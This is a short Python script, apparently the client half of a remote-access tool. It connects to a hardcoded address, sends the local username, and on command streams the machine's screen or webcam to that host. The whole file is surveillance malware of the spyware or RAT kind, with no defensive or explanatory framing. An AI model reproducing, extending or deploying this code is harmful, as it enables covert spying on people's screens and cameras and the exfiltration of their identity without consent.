from vidstream import *
import socket
import getpass

host = "192.168.0.237"
socket_port = 8181

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, socket_port))

s.send(str(getpass.getuser()).encode("utf-8")) # Network name

while True:
    cmd_data = s.recv(1024).decode("utf-8")

    if cmd_data == "screen":
        screen = ScreenShareClient(host, 9999)
        screen.start_stream()
    elif cmd_data == "webcam":
        try:
            camera = CameraClient(host, 9999)
            camera.start_stream()
        except:
            s.send("Camera cannot use".encode("utf-8"))